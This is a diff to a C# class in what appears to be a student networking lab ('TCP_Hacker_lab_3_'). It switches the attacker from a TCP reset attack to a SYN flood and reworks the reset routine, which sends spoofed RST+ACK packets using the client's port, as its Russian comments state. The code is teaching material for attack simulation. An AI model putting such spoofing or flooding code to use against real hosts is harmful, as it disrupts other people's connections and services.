@@ -12,25 +12,13 @@ namespace TCP_Hacker_lab_3_
     {
         public async Task ConnectToServer(IPEndPoint clientIP, CancellationToken token)
         {
-            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            await Task.Delay(1000);
-            try
-            {
-                //SynFloodAttack();
-                ResetAttack();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Ошибка со стороны хакера: {ex.Message}");
-            }
-            finally
-            {
-                if (clientSocket.Connected)
-                    clientSocket.Close();
-            }
+            await Task.Delay(500);
+
+            SynFloodAttack();
+            //ResetAttack(token);
         }
 
-        private void ResetAttack()
+        private void ResetAttack(CancellationToken token)
         {
             Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
@@ -49,19 +37,23 @@ namespace TCP_Hacker_lab_3_
 
                 //Подключение установлено. Теперь пытаемся разорвать соединение
 
-                Parallel.For(0, 1000, (int i) =>
+                for(int i = 5; i < 100; i++)
                 {
+                    if (token.IsCancellationRequested)
+                        break;
+
+                    Thread.Sleep(100);
                     try
                     {
                         //Отправляем пакеты с флагом RST и подставляем порт нашего клиента, типа это он отправил
-                        SendPacket(clientSocket, TCPPacket.GetEmptyPacket(4, Constans.ClientPort, Server.ServerIP.Port, 0, 0, rst: true, ack: true));
+                        SendPacket(clientSocket, TCPPacket.GetEmptyPacket(4, Constans.ClientPort, Server.ServerIP.Port, (uint)i * 4 + 1, 1, rst: true, ack: true));
                     }
                     catch { }
-                });
+                }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Ошибка у клиента при работе с сервером: {ex.Message}");
+                Console.WriteLine($"Ошибка у хакера при работе с сервером: {ex.Message}");
                 //throw;
             }
             finally
